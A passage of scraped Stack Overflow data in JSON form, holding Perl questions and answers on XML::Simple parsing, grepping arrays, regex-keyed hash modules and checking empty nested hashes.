version=\"1.0\"?&gt;\n&lt;data&gt;\n&lt;pattern&gt;123456&lt;/pattern&gt;\n&lt;pattern&gt;654321&lt;/pattern&gt;\n&lt;pattern&gt;abcdefg&lt;/pattern&gt;\n&lt;pattern owners=\"alex\"&gt;heloworld&lt;/pattern&gt;\n&lt;pattern owners=\"alex\"&gt;perlprogramming&lt;/pattern&gt;\n&lt;/data&gt;\n</code></pre>\n\n<p>This is my perl code to parse this file:</p>\n\n<pre><code>use XML::Simple;\nuse strict;\nuse Data::Dumper;\n\nmy $xml = new XML::Simple;\nmy $data = $xml-&gt;XMLin(\"DEMO.xml\");\nprint Dumper($data);\n</code></pre>\n\n<p>And here is what I got:</p>\n\n<pre><code>$VAR1 = {\n          'pattern' =&gt; [\n                       '123456',\n                       '654321',\n                       'abcdefg',\n                       {\n                         'owners' =&gt; 'alex',\n                         'content' =&gt; 'heloworld'\n                       },\n                       {\n                         'owners' =&gt; 'alex',\n                         'content' =&gt; 'perlprogramming'\n                       }\n                     ]\n        };\n</code></pre>\n\n<p>May I know if I just simply print out the content of xml tag, what should I do ?</p>\n\n<p>The expected output might look like:</p>\n\n<pre><code>123456\n654321\nacdefg\nheloworld\nperlprogramming\n</code></pre>\n\n<p>Thank you so much! </p>\n\n<p>Alex</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 0, "creation_date": 1462786160, "post_id": 37111997, "comment_id": 61765772, "body": "Please show the sourcecode you tried to use. <code>grep</code> is the way to go."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 6, "creation_date": 1462788102, "post_id": 37111997, "comment_id": 61766991, "body": "&quot;It&#39;s not working&quot; is a terrible way to explain the problem. What, exactly, have you tried? What unexpected behaviour are you seeing?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1463024842, "post_id": 37111997, "comment_id": 61888195, "body": "I suggest that you mark answers accordingly, see <a href=\"http://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>.  It is OK to accept your own answer as well, see <a href=\"http://stackoverflow.com/help/accepted-answer\">this SO help page</a>. This helps other users."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1481339143, "post_id": 37111997, "comment_id": 69350370, "body": "Please have a look at <a href=\"http://stackoverflow.com/help/someone-answers\"><code>What should I do when someone answers my question?</code></a>"}], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1462788600, "post_id": 37112190, "comment_id": 61767368, "body": "But also: Don&#39;t use <code>$a</code>. It&#39;s not a good variable name, and it&#39;s used by <code>sort</code>."}], "tags": [], "owner": {"reputation": 494, "user_id": 6182200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a10cfc81a61d5aac8ebaf106ae04fde9?s=128&d=identicon&r=PG&f=1", "display_name": "quemeraisc", "link": "https://stackoverflow.com/users/6182200/quemeraisc"}, "is_accepted": false, "score": -1, "last_activity_date": 1462786302, "creation_date": 1462786302, "answer_id": 37112190, "question_id": 37111997, "link": "https://stackoverflow.com/questions/37111997/perl-grepping-from-an-array/37112190#37112190", "title": "Perl Grepping from an Array", "body": "<p>You should escape characters like '/' and '.' in any regex when you need it as a character. </p>\n\n<p>Likewise :</p>\n\n<pre><code>$a=\"branches\\/Soft\\/a\\.txt\"\n</code></pre>\n\n<p>Retry whatever you did with either grep or perl with that. If it still doesn't work, tell us precisely what you tried.</p>\n"}, {"comments": [{"owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462951868, "post_id": 37112365, "comment_id": 61848356, "body": "thanks. i was trying with more than one value in $str (Ofcourse in an array @str) in the above example and i did used foreach to loop and grep for each value from an array but i couldnt succeed."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 1, "creation_date": 1462952560, "post_id": 37112365, "comment_id": 61848769, "body": "@John  Can you show those strings you were trying?  Edit your question and type them in so that I can see them. It is hard for me to know what is wrong without information."}, {"owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462956633, "post_id": 37112365, "comment_id": 61851287, "body": "In tha same above example. Instead of $str, i&#39;m using @str = (&#39;branches/Soft/a.txt&#39;, &#39;branches/Soft/b.txt&#39;); Now, i need to loop it and found each string has present in array paths or not"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462956983, "post_id": 37112365, "comment_id": 61851547, "body": "@John  You cannot do that. The &quot;pattern&quot; looked for has to be a scalar (single string), not an array. Having an array in there, like <code>m&#47;@str&#47;</code>,  will do something completely different, not what you want.  If you want to check more strings, whether each exists in an array, you would use code like above for each one in turn (in a separate overall loop, for example)."}, {"owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462957490, "post_id": 37112365, "comment_id": 61851909, "body": "No. I i&#39;m not doing m/arraystr/. I&#39;m looping the arraystr (foreach my $str arraystr), then using the code my $got_match = any { $_ =~ m/$str/ } arraypaths; and checking with if condition that $got_match is defined or not for each value in arraystr. But i guess i&#39;m missing something.. Please note that i used array to poin (at) symbol since its not allowing more than one (at) in Comments.."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462957854, "post_id": 37112365, "comment_id": 61852161, "body": "@John Ah, OK, sorry.  That should work ...?  The first one you show should match, the second one not (different directories in path of the second element, with <code>Docs&#47;A1</code>). I think that with <code>any</code> it should be 0 or 1 (not undefined in any case).  I just tested, <code>grep</code> prints 0 as well when there is no match. Let me know what exactly you are doing if you can&#39;t get it to work."}, {"owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462957990, "post_id": 37112365, "comment_id": 61852259, "body": "i have edited my question. and that is my exact requirement."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462959611, "post_id": 37112365, "comment_id": 61853323, "body": "@John  I just tested it and it works as it should. I&#39;ll add it to the post.   Run this from the command line, where I use &quot;at_&quot; instead of &#39;at&#39; symbol:     perl -wE &#39;at_m = (&quot;branches/Soft/a.txt&quot;, &quot;branches/Soft/h.cpp&quot;, &quot;branches/Main/utils.pl&quot;); at_Array = (&quot;branches/Soft/a.txt&quot;, &quot;branches/Soft/h.cpp&quot;, &quot;branches/Main/utils.pl&quot;, &quot;branches/Soft/B2/c.tct&quot;, &quot;branches/Docs/A1/b.txt&quot;); for $str (at_m) { $m = grep { /$str/ } (at_Array); say &quot;Match for $str&quot; if $m; }&#39;"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462962352, "post_id": 37112365, "comment_id": 61855318, "body": "@John  Added it to the end of the post, for both <code>grep</code> and the manual <code>foreach</code> example."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 2, "last_activity_date": 1462962028, "last_edit_date": 1462962028, "creation_date": 1462786737, "answer_id": 37112365, "question_id": 37111997, "link": "https://stackoverflow.com/questions/37111997/perl-grepping-from-an-array/37112365#37112365", "title": "Perl Grepping from an Array", "body": "<p>It works for me with <a href=\"http://perldoc.perl.org/functions/grep.html\" rel=\"nofollow\"><code>grep</code></a>.  You'd do it the exact same way as in the <code>More::ListUtils</code> example below, except for having <code>grep</code> instead of <code>any</code>. You can also shorten it to  </p>\n\n<pre><code> my $got_it  = grep { /$str/ } @paths;\n my @matches = grep { /$str/ } @paths;\n</code></pre>\n\n<p>This by default tests with <code>/m</code> against <code>$_</code>, each element of the list in turn. The <code>$str</code> and <code>@paths</code> are the same as below.  </p>\n\n<hr>\n\n<p>You can use the module <code>More::ListUtils</code> as well.  Its function <code>any</code> returns true/false depending on whether the condition in the block is satisfied for <em>any</em> element in the list, ie. whether there was a match in this case.</p>\n\n<pre><code>use warnings;   \nuse strict;\n\nuse Most::ListUtils;\n\nmy $str = 'branches/Soft/a.txt';\n\nmy @paths = ('branches/Soft/a.txt', 'branches/Soft/b.txt',\n    'branches/Docs/A1/b.txt', 'branches/Soft/B2/c.tct');\n\nmy $got_match = any { $_ =~ m/$str/ } @paths;\n</code></pre>\n\n<p>With the list above, containing the <code>$str</code>, the <code>$got_match</code> is <code>1</code>. </p>\n\n<p>Or you can roll it by hand and catch the match as well</p>\n\n<pre><code>foreach my $p (@paths) {\n    print \"Found it: $1\\n\" if $p =~ m/($str)/;\n}\n</code></pre>\n\n<p>This does print out the match.</p>\n\n<p><strong>Note</strong> that the strings you show in your example <em>do not</em> contain the one to match.  I added it to my list for a test.  Without it in the list no match is found in either of the examples.</p>\n\n<hr>\n\n<p>To test for more than one string, with the added sample</p>\n\n<pre><code>my @strings = ('branches/Soft/a.txt', 'branches/Soft/h.cpp', 'branches/Main/utils.pl');\nmy @paths = ('branches/Soft/a.txt', 'branches/Soft/h.cpp', 'branches/Main/utils.pl',\n     'branches/Soft/B2/c.tct', 'branches/Docs/A1/b.txt');\n\nforeach my $str (@strings) {\n    foreach my $p (@paths) {\n        print \"Found it: $1\\n\" if $p =~ m/($str)/;\n    }\n    # Or, instead of the foreach loop above use\n    # my $match = grep { /$str/ } @paths;\n    # print \"Matched for $str\\n\" if $match;\n}\n</code></pre>\n\n<p>This prints </p>\n\n<pre>\nFound it: branches/Soft/a.txt\nFound it: branches/Soft/h.cpp\nFound it: branches/Main/utils.pl\n</pre>\n\n<p>When the lines with <code>grep</code> are uncommented and <code>foreach</code> ones commented out I get the corresponding prints for the same strings.</p>\n"}, {"comments": [{"owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "edited": false, "score": 0, "creation_date": 1462950624, "post_id": 37114291, "comment_id": 61847578, "body": "I tried the above solutions. It worked for grepping one value from the array. But it didnt worked in case of more than one value. I did used foreach loop to search for each value in an array but i couldnt succeed."}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 0, "last_activity_date": 1462811978, "last_edit_date": 1462811978, "creation_date": 1462792268, "answer_id": 37114291, "question_id": 37111997, "link": "https://stackoverflow.com/questions/37111997/perl-grepping-from-an-array/37114291#37114291", "title": "Perl Grepping from an Array", "body": "<p>The <s>slashes</s> dot in <code>$a</code> will pose a problem so you either have to escape <s>them</s> it when doing regex match or use a simple <code>eq</code> to find the matches:</p>\n\n<p>Regex match with <code>$a</code> escaped:</p>\n\n<pre><code>my @matches = grep { /\\Q$a\\E/ } @array;\n</code></pre>\n\n<p>Simple comparison with \"equals\":</p>\n\n<pre><code>my @matches = grep { $_ eq $a } @array;\n</code></pre>\n\n<p>With your sample data both will give an empty array <code>@matches</code> because there is no match. </p>\n"}, {"tags": [], "owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "is_accepted": true, "score": 0, "last_activity_date": 1462974499, "creation_date": 1462974499, "answer_id": 37164655, "question_id": 37111997, "link": "https://stackoverflow.com/questions/37111997/perl-grepping-from-an-array/37164655#37164655", "title": "Perl Grepping from an Array", "body": "<p>This Solved My Question. Thanks to all especially @zdim for the valuable time and support</p>\n\n<pre><code>   my @SVNFILES = ('branches/Soft/a.txt', 'branches/Soft/b.txt');\n   my @paths = ('branches/Soft/a.txt', 'branches/Soft/b.txt',\n'branches/Docs/A1/b.txt', 'branches/Soft/B2/c.tct');\n\n            foreach my $svn (@SVNFILES)\n            {\n            chomp ($svn);\n            my $m = grep { /$svn/ } (@paths);\n\n                            if ( $m eq '0' ) {\n                            print \"Files Mismatch\\n\";\n                            exit 1;\n                            }\n\n            }\n</code></pre>\n"}], "owner": {"reputation": 59, "user_id": 4469941, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/dd3eb062e4af9f144fcba827cf2c2354?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4469941/john"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 913, "favorite_count": 0, "accepted_answer_id": 37164655, "answer_count": 4, "score": 0, "last_activity_date": 1462974499, "creation_date": 1462785714, "last_edit_date": 1462957920, "question_id": 37111997, "link": "https://stackoverflow.com/questions/37111997/perl-grepping-from-an-array", "title": "Perl Grepping from an Array", "body": "<p>I need to grep a value from an array.\nFor example i have a values</p>\n\n<pre><code>@a=('branches/Soft/a.txt', 'branches/Soft/h.cpp', branches/Main/utils.pl');\n</code></pre>\n\n<p>@Array = ('branches/Soft/a.txt', 'branches/Soft/h.cpp', branches/Main/utils.pl','branches/Soft/B2/c.tct', 'branches/Docs/A1/b.txt');</p>\n\n<p>Now, i need to loop @a and find each value matches to @Array. For Example</p>\n"}, {"tags": ["regex", "perl", "hashmap", "key"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1462785746, "post_id": 37111960, "comment_id": 61765509, "body": "I think that you have the full answer in <a href=\"http://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/\">this post</a> of yesterday."}], "answers": [{"comments": [{"owner": {"reputation": 173, "user_id": 1154425, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4717f61b69f768ef4abfd524addd3ab2?s=128&d=identicon&r=PG", "display_name": "feng63600", "link": "https://stackoverflow.com/users/1154425/feng63600"}, "edited": false, "score": 0, "creation_date": 1462788272, "post_id": 37112836, "comment_id": 61767121, "body": "Is there less expensive options we can go for?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 173, "user_id": 1154425, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4717f61b69f768ef4abfd524addd3ab2?s=128&d=identicon&r=PG", "display_name": "feng63600", "link": "https://stackoverflow.com/users/1154425/feng63600"}, "edited": false, "score": 3, "creation_date": 1462788365, "post_id": 37112836, "comment_id": 61767197, "body": "Both modules are open source and freely available from CPAN. It doesn&#39;t get any less expensive than that :-)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 173, "user_id": 1154425, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4717f61b69f768ef4abfd524addd3ab2?s=128&d=identicon&r=PG", "display_name": "feng63600", "link": "https://stackoverflow.com/users/1154425/feng63600"}, "edited": false, "score": 0, "creation_date": 1462870840, "post_id": 37112836, "comment_id": 61806702, "body": "Oh, I knew what you meant :-) And, no, I can&#39;t think of any way of doing this that isn&#39;t going to have a horrible effect on performance. Think of what you&#39;re asking. You want to invoke the regex engine on every hash look-up. That&#39;s never going to be fast."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 3, "last_activity_date": 1462788028, "creation_date": 1462788028, "answer_id": 37112836, "question_id": 37111960, "link": "https://stackoverflow.com/questions/37111960/perl-using-regexp-string-as-hash-keys/37112836#37112836", "title": "Perl - Using RegExp string as hash keys", "body": "<p>From the synopsis of <a href=\"https://metacpan.org/pod/Tie::RegexpHash\" rel=\"nofollow\">Tie::RegexpHash</a>:</p>\n\n<pre><code>use Tie::RegexpHash;\n\nmy %hash;\n\ntie %hash, 'Tie::RegexpHash';\n\n$hash{ qr/^5(\\s+|-)?gal(\\.|lons?)?/i } = '5-GAL';\n\n$hash{'5 gal'};     # returns \"5-GAL\"\n$hash{'5GAL'};      # returns \"5-GAL\"\n$hash{'5  gallon'}; # also returns \"5-GAL\"\n\nmy $rehash = Tie::RegexpHash-&gt;new();\n\n$rehash-&gt;add( qr/\\d+(\\.\\d+)?/, \"contains a number\" );\n$rehash-&gt;add( qr/s$/,          \"ends with an \\`s\\'\" );\n\n$rehash-&gt;match( \"foo 123\" );  # returns \"contains a number\"\n$rehash-&gt;match( \"examples\" ); # returns \"ends with an `s'\"\n</code></pre>\n\n<p>Which is, I think what you want. Alternatively, my <a href=\"https://metacpan.org/pod/Tie::Hash::Regex\" rel=\"nofollow\">Tie::Hash::Regex</a> uses regexes when looking for hash keys.</p>\n\n<pre><code>use Tie::Hash::Regex;\nmy %h;\n\ntie %h, 'Tie::Hash::Regex';\n\n$h{key}   = 'value';\n$h{key2}  = 'another value';\n$h{stuff} = 'something else';\n\nprint $h{key};  # prints 'value'\nprint $h{2};    # prints 'another value'\nprint $h{'^s'}; # prints 'something else'\n\nprint tied(%h)-&gt;FETCH(k); # prints 'value' and 'another value'\n\ndelete $h{k};   # deletes $h{key} and $h{key2};\n</code></pre>\n"}], "owner": {"reputation": 173, "user_id": 1154425, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4717f61b69f768ef4abfd524addd3ab2?s=128&d=identicon&r=PG", "display_name": "feng63600", "link": "https://stackoverflow.com/users/1154425/feng63600"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 616, "favorite_count": 0, "accepted_answer_id": 37112836, "answer_count": 1, "score": 0, "last_activity_date": 1462788028, "creation_date": 1462785577, "question_id": 37111960, "link": "https://stackoverflow.com/questions/37111960/perl-using-regexp-string-as-hash-keys", "title": "Perl - Using RegExp string as hash keys", "body": "<p>Does Perl provide any modules that support using RegExp string as hash keys and allow using a matched string as a key to find value?</p>\n\n<p>For example,</p>\n\n<pre><code>%h = {\n  'a.*' : 'case - a',\n  'b.*' : 'case - b',\n  'c.*' : 'case - c'\n}\n\n# expected output\nprint %h{'app'} # case - a\nprint %h{'bar'} # case - b\nprint %h{'car'} # case - c\n</code></pre>\n\n<p>This example can be handled by an if regex statement, but it will be handy if there is any modules support the functionality.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462776534, "post_id": 37109330, "comment_id": 61760538, "body": "Which line is line 85"}, {"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462776572, "post_id": 37109330, "comment_id": 61760557, "body": "the print i posted"}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462776711, "post_id": 37109330, "comment_id": 61760622, "body": "try to use: print $data-&gt;{&quot;SOAP:Body&quot;}-&gt;{&quot;ns1:MT_DF_AssetMaster_Response&quot;}-&gt;{&quot;&zwnj;&#8203;ASSETCREATED&quot;}=&gt;{&quot;AS&zwnj;&#8203;SET&quot;}.&quot;\\n&quot;;"}, {"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462777555, "post_id": 37109330, "comment_id": 61761020, "body": "tried that but only getting HASH(0x34d66e0) not the exact value which is empty."}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462777637, "post_id": 37109330, "comment_id": 61761068, "body": "It is right, The value of {&quot;ASSET&quot;} is a hash. What are your expectations?"}, {"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462778099, "post_id": 37109330, "comment_id": 61761319, "body": "i just need to know if the {&quot;ASSET&quot;} is empty, if i try if($asset) it always echo the HASH and not read as empty"}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462778222, "post_id": 37109330, "comment_id": 61761382, "body": "Try this: if (%$asset) ..."}, {"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462778473, "post_id": 37109330, "comment_id": 61761507, "body": "if(%$asset_number) but got this response Can&#39;t use string (&quot;HASH(0x1584598) &quot;) as a HASH ref while &quot;strict refs&quot; in use at ./asset_creation.pl line 88."}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462778535, "post_id": 37109330, "comment_id": 61761544, "body": "What is asset_number?"}, {"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462782492, "post_id": 37109330, "comment_id": 